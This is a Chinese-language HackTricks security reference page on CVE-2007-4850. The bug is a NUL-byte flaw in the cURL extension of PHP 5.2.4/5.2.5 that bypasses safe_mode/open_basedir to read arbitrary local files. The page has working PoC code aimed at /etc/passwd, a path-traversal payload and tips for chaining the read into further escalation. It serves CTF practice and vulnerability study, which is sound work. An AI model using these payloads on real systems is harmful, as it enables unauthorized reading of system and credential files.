# PHP 5.2.4 和 5.2.5 — PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

本页记录了一个针对特定 PHP 5.2.x 构建的遗留技巧，可使用 cURL 扩展绕过 PHP 的 safe_mode/open_basedir 检查，仍然在 CTFs 或本地遗留安装中有用。

- 受影响: PHP 5.2.4 和 5.2.5（启用 ext/curl）。
- 影响: 可在存在 safe_mode 或 open_basedir 限制的情况下读取任意本地文件（不能直接执行代码）。
- 编号: CVE-2007-4850。

来源: http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## 单行 PoC

如果 safe_mode 或 open_basedir 启用且 cURL 已启用，下面的命令将返回当前脚本的内容：
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## 更明确的 PoC (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
注意事项:
- 使用双引号或 chr(0) 注入真实的 NUL 字节。Percent-encoding (%00) 不能可靠地工作。
- 这是一个文件读取原语。尽可能与其他原语结合（log poisoning, session file inclusion, etc.）以便进一步升级。

## 为什么这行得通（简要）

漏洞在于 PHP 5.2.4/5.2.5 在 ext/curl 中对 file:// URL 执行 safe_mode/open_basedir 检查的方式。检查会解析 URL 并验证某个路径组件，但由于对 NUL-byte 的处理，它验证了与 libcurl 实际使用的字符串不同的内容。实际上，验证器可能会批准 NUL 之后的路径，而 libcurl 使用 NUL 之前的部分作为 URL 容器，从而实现绕过并读取放在 NUL 字节之后的文件。有关详细信息，请参阅原始分析和 curl/interface.c 中受影响的宏。 [CVE-2007-4850].

## 约束与修复

- 在后续的 5.2.x 中修复（例如，发行版构建已修补到 5.2.6），通过修正 ext/curl 中的解析/验证实现修复。
- 仅影响非常旧的 PHP 部署；safe_mode 在 PHP 5.4 中被移除，现代构建不再表现出此行为。

## 相关的历史 cURL 绕过

- CVE-2006-2563 (PHP 4.4.2/5.1.4): libcurl wrappers 允许带有嵌入 NUL 的 `file://` 访问以绕过 open_basedir；在 5.2.x 之前已修复。
- PHP bugs #30609/#36223 跟踪了早期在没有规范化的情况下使用 `file://` 的 cURL open_basedir 问题。任何在 NUL 字节之前进行的检查或未进行 `realpath` 类解析的检查都容易遭受相同的截断问题。

## CTF 提示

- 当你识别出带有 ext/curl 的 PHP 5.2.4/5.2.5（在 `phpinfo()` 中查找 `cURL support => enabled` 和准确的 `PHP Version`）时，这个技巧通常有效，即使 `allow_url_fopen` 被禁用，因为 ext/curl 自行处理 `file://`。
- 如果直接路径被阻止，尝试在 NUL 之后使用相对遍历，例如 `file://x\x00../../../../etc/passwd`。遍历由 libcurl 解析，而不是由 open_basedir 防护解析。
- 你可以把有效负载包装在单个 HTTP 请求体中，通过易受攻击的服务器端代码触发 LFI，该代码将用户可控的 URL 镜像到 `curl_exec()`（在遗留的类似 SSRF 的端点中常见）。

## 另请参见

Other disable_functions/open_basedir bypasses and modern techniques are collected here:

{{#ref}}
README.md
{{#endref}}

## References

- [Ubuntu CVE entry with patch pointers and affected versions](https://ubuntu.com/security/CVE-2007-4850)
- [Technical writeup with code context (cxsecurity)](http://cxsecurity.com/issue/WLB-2008010060)
- [PHP bug #36223 (curl bypasses open_basedir)](https://bugs.php.net/bug.php?id=36223)
- [CVE-2006-2563 cURL PHP File Access Bypass (earlier NUL-byte issue)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2563)
{{#include ../../../../banners/hacktricks-training.md}}
